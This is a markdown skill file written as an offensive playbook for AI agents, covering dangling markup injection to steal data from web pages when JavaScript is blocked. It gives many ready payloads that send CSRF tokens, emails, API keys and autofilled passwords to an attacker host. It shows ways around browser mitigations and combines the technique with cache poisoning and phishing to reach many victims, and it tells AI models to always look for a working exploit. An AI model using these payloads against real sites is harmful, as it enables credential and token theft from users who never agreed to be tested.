---
name: dangling-markup-injection
description: >-
  Dangling markup injection playbook. Use when HTML injection is possible but
  JavaScript execution is blocked (CSP, sanitizer strips event handlers, WAF
  blocks script tags) — exfiltrate CSRF tokens, session data, and page content
  by injecting unclosed HTML tags that capture subsequent page content.
---

# SKILL: Dangling Markup Injection — Exfiltration Without JavaScript

> **AI LOAD INSTRUCTION**: Covers dangling markup exfiltration via unclosed img/form/base/meta/link/table tags, what can be stolen (CSRF tokens, pre-filled form values, sensitive content), browser-specific behavior, and combinations with other attacks. Base models often overlook this technique entirely when CSP blocks scripts, jumping to "not exploitable" — dangling markup is the answer.

## 0. RELATED ROUTING

- [xss-cross-site-scripting](../xss-cross-site-scripting/SKILL.md) when full XSS is possible (no need for dangling markup)
- [csp-bypass-advanced](../csp-bypass-advanced/SKILL.md) when CSP blocks JS execution — dangling markup bypasses script restrictions
- [csrf-cross-site-request-forgery](../csrf-cross-site-request-forgery/SKILL.md) when dangling markup steals CSRF tokens for subsequent CSRF attacks
- [crlf-injection](../crlf-injection/SKILL.md) when CRLF enables HTML injection in HTTP response
- [web-cache-deception](../web-cache-deception/SKILL.md) when dangling markup + cache poisoning amplifies the attack

---

## 1. WHEN TO USE DANGLING MARKUP

You need dangling markup when ALL of these are true:

1. You have an HTML injection point (reflected or stored)
2. JavaScript execution is blocked:
   - CSP blocks inline scripts and event handlers
   - Sanitizer strips `<script>`, `onerror`, `onload`, etc.
   - WAF blocks known XSS patterns
3. The page contains sensitive data AFTER your injection point:
   - CSRF tokens
   - Pre-filled form values (email, username, API keys)
   - Session identifiers in hidden fields
   - Sensitive user content

**Core insight**: You don't need JavaScript to exfiltrate data — you just need the browser to make a request that includes the data in the URL.

---

## 2. CORE TECHNIQUE

Inject an unclosed HTML tag with a `src`, `href`, `action`, or similar attribute pointing to your server. The unclosed attribute quote "consumes" all subsequent page content until the browser finds a matching quote.

```html
Page before injection:
  <div>Hello USER_INPUT</div>
  <form>
    <input type="hidden" name="csrf" value="SECRET_TOKEN_123">
    <input type="text" name="email" value="user@target.com">
  </form>

Injected payload:
  <img src="https://attacker.com/collect?

Resulting HTML:
  <div>Hello <img src="https://attacker.com/collect?</div>
  <form>
    <input type="hidden" name="csrf" value="SECRET_TOKEN_123">
    <input type="text" name="email" value="user@target.com">
  </form>
  ...rest of page until next matching quote (")...
```

The browser interprets everything from `https://attacker.com/collect?` until the next `"` as the URL. The hidden CSRF token and email value become part of the URL query string sent to `attacker.com`.

---

## 3. EXFILTRATION VECTORS

### 3.1 Image Tag (Most Common)

```html
<!-- Double-quote context -->
<img src="https://attacker.com/collect?

<!-- Single-quote context -->
<img src='https://attacker.com/collect?

<!-- Backtick context (IE only, legacy) -->
<img src=`https://attacker.com/collect?
```

The browser sends a GET request to `attacker.com` with all consumed content as query parameters.

**Blocked by**: `img-src` CSP directive

### 3.2 Form Action Hijack

```html
<form action="https://attacker.com/collect">
<button>Click to continue</button>
<!--
```

If the page has form elements after the injection point, the next `</form>` closes the attacker's form. All input fields between become part of the attacker's form → submitted to attacker on user interaction.

**Blocked by**: `form-action` CSP directive

**Trick**: Even without user interaction, if there's an existing submit button or JavaScript auto-submit, the form submits automatically.

### 3.3 Base Tag Hijack

```html
<base href="https://attacker.com/">
```

All subsequent relative URLs on the page resolve to attacker's server:
- `<script src="/js/app.js">` → loads `https://attacker.com/js/app.js`
- `<a href="/profile">` → links to `https://attacker.com/profile`
- `<form action="/submit">` → submits to `https://attacker.com/submit`

**Blocked by**: `base-uri` CSP directive

### 3.4 Meta Refresh Redirect

```html
<meta http-equiv="refresh" content="0;url=https://attacker.com/collect?
```

Redirects the entire page to attacker's server with consumed page content in the URL.

**Blocked by**: `navigate-to` CSP directive (rarely set), some browsers ignore meta refresh when CSP is present.

### 3.5 Link/Stylesheet Exfiltration

```html
<link rel="stylesheet" href="https://attacker.com/collect?
```

Browser requests the URL as a CSS resource, leaking consumed content.

**Blocked by**: `style-src` CSP directive

### 3.6 Table Background (Legacy)

```html
<table background="https://attacker.com/collect?
```

Works in older browsers that support the `background` attribute on table elements.

**Blocked by**: `img-src` CSP directive

### 3.7 Video/Audio Poster

```html
<video poster="https://attacker.com/collect?
<audio src="https://attacker.com/collect?
```

**Blocked by**: `media-src` / `img-src` CSP directives

---

## 4. WHAT CAN BE STOLEN

| Target Data | How It Appears in Page | Steal Technique |
|---|---|---|
| CSRF token | `<input type="hidden" name="csrf" value="...">` | Dangling `<img src=` before the form |
| Pre-filled email | `<input value="user@example.com">` | Dangling tag before the input |
| API keys in page | `var apiKey = "sk-..."` in inline script | Dangling tag before the script block |
| Session ID in hidden field | `<input name="session" value="...">` | Dangling tag before the form |
| Auto-filled passwords | Browser auto-fills password field | `<form action=attacker>` with matching input names |
| OAuth state/tokens | In URL parameters or hidden form fields | Dangling tag on authorization page |
| Internal URLs/paths | Links, script sources, API endpoints | `<base>` tag hijack captures all relative URLs |

---

## 5. BROWSER-SPECIFIC BEHAVIOR

| Browser | Behavior |
|---|---|
| **Chrome/Chromium** | Blocks dangling markup in `<img>` `src` containing `<` or newlines (since Chrome 60). Still allows `<form action>`, `<base>`, `<link>`. |
| **Firefox** | More permissive with dangling markup in image sources. Allows newlines in attribute values. |
| **Safari** | Similar to Chrome's restrictions. May handle some edge cases differently. |
| **Edge (Chromium)** | Same as Chrome behavior. |

### Chrome Mitigation Detail

Chrome blocks navigation/resource load when the URL attribute value contains:
- `<` character (indicates HTML tag consumption)
- Newline characters (`\n`, `\r`)

**Bypass**: Use `<form action>` instead of `<img src>` — Chrome's block only targets specific tags.

---

## 6. ADVANCED TECHNIQUES

### 6.1 Selective Consumption

Choose quote type strategically: if page uses `"` for attributes, inject with `'` (and vice versa) to precisely control where consumption stops.

### 6.2 Textarea + Form Combo

`<form action="https://attacker.com/collect"><textarea name="data">` — unclosed textarea eats all subsequent HTML as plaintext; form submission sends it to attacker.

### 6.3 Comment / Style Dangling

- `<!-- ` without closing `-->` consumes all content (no exfil, but hides page content)
- `<style>` unclosed treats page as CSS; combine with `@import url("https://attacker.com/?` for exfil

### 6.4 Window.name via iframe

`<iframe src="https://target.com/page" name="` — name attribute consumes content, and `window.name` persists across origins after navigation.

---

## 7. LIMITATIONS

| Limitation | Detail |
|---|---|
| Same-origin content only | Dangling markup only captures content from the same HTTP response |
| Quote matching | Consumption stops at the next matching quote character — may not reach target data |
| CSP img-src/form-action | Strict CSP can block most exfiltration vectors |
| Chrome's dangling markup mitigation | Blocks `<img src=` with `<` or newlines in URL |
| Injection point must be before target data | Can only capture content that appears after the injection in HTML source order |
| Content encoding | URL-unsafe characters in captured content may be mangled |

---

## 8. COMBINATION ATTACKS

### 8.1 Dangling Markup + Open Redirect

```
1. Inject <img src="https://target.com/redirect?url=https://attacker.com/collect?
2. Open redirect on target.com makes the request "same-origin" for some CSP checks
3. Redirect sends captured data to attacker
```

### 8.2 Dangling Markup + Cache Poisoning

```
1. Find reflected HTML injection point
2. Inject dangling markup payload
3. If response is cached, ALL users see the dangling markup
4. Tokens/data from all victims exfiltrated
```

This turns a reflected injection into a stored/persistent attack.

### 8.3 Dangling Markup + CSRF

```
1. Use dangling markup to steal CSRF token from page
2. Use stolen token to perform CSRF attack
3. Allows CSRF even when tokens are properly implemented
```

### 8.4 Dangling Markup + Clickjacking

```
1. Inject <form action="https://attacker.com/collect"><textarea name="data">
2. Frame the page (if frame-ancestors allows)
3. Trick user into clicking "Submit" via clickjacking overlay
4. Form submits all captured page content to attacker
```

---

## 9. DANGLING MARKUP DECISION TREE

```
HTML injection exists but XSS is blocked (CSP/sanitizer/WAF)?
│
├── Identify injection context
│   ├── Inside attribute value? → Break out first: "><img src="https://attacker.com/collect?
│   ├── Inside tag content? → Inject directly: <img src="https://attacker.com/collect?
│   └── Inside script block? → Close script first: </script><img src="...
│
├── What sensitive data exists AFTER injection point?
│   ├── CSRF tokens → HIGH VALUE: steal token → CSRF attack
│   ├── User PII (email, name) → data theft
│   ├── API keys / secrets → account compromise
│   ├── No sensitive data after injection → dangling markup not useful here
│   └── Check different pages — injection may be on a page with sensitive data
│
├── Choose exfiltration vector based on CSP
│   ├── No CSP / lax CSP → <img src="...  (simplest)
│   ├── img-src restricted?
│   │   ├── form-action unrestricted? → <form action="attacker"><textarea name=d>
│   │   ├── base-uri unrestricted? → <base href="attacker">
│   │   └── style-src unrestricted? → <link rel=stylesheet href="...
│   ├── Strict CSP on all directives?
│   │   ├── meta refresh? → <meta http-equiv="refresh" content="0;url=attacker?
│   │   ├── DNS prefetch? → <link rel=dns-prefetch href="//data.attacker.com">
│   │   └── Window.name via iframe? → <iframe name="...
│   └── Nothing works? → dangling markup blocked, try other approaches
│
├── Handle Chrome's dangling markup mitigation
│   ├── Target uses Chrome? → Avoid <img src= with < or newlines
│   ├── Use <form action=> instead (not blocked)
│   ├── Use <base href=> (not blocked)
│   └── Test in Firefox as fallback (more permissive)
│
├── Choose quote type for maximum capture
│   ├── Target data uses double quotes? → Inject with single quote: <img src='...
│   ├── Target data uses single quotes? → Inject with double quote: <img src="...
│   └── Mixed quotes? → Test both, see which captures more useful data
│
└── Amplification
    ├── Response cached? → Poison cache → steal from multiple victims
    ├── Stored injection? → Every page view exfiltrates
    └── Reflected only? → Deliver via phishing link
```

---

## 10. TRICK NOTES — WHAT AI MODELS MISS

1. **Dangling markup is THE answer when CSP blocks scripts but HTML injection exists.** Models trained on XSS often conclude "not exploitable" when CSP is strict — dangling markup doesn't need JavaScript.
2. **Chrome's mitigation is tag-specific, not universal**: `<img src=` is mitigated, but `<form action=`, `<base href=`, `<meta http-equiv=refresh>` are NOT. Always try alternative vectors.
3. **Quote type selection is critical**: If the page uses `"` for attributes, inject with `'` (or vice versa) to control exactly where consumption stops. Wrong quote type = capturing useless content or nothing.
4. **Injection point placement matters enormously**: The injection must appear BEFORE the target data in the HTML source. If CSRF token is above your injection point, dangling markup cannot capture it.
5. **`<textarea>` is the most underrated vector**: An unclosed textarea eats ALL subsequent HTML as plaintext. Combined with form action hijack, it's the most reliable method when img-src is restricted.
6. **Window.name persists across origins**: If you can inject an iframe, the `name` attribute technique is powerful because `window.name` survives cross-origin navigation — a rare cross-origin data channel.
7. **DNS prefetch exfiltration works even under strict CSP**: `<link rel=dns-prefetch href="//stolen-data.attacker.com">` triggers a DNS lookup that CSP cannot block. Limited to ~253 characters per label, but sufficient for tokens.
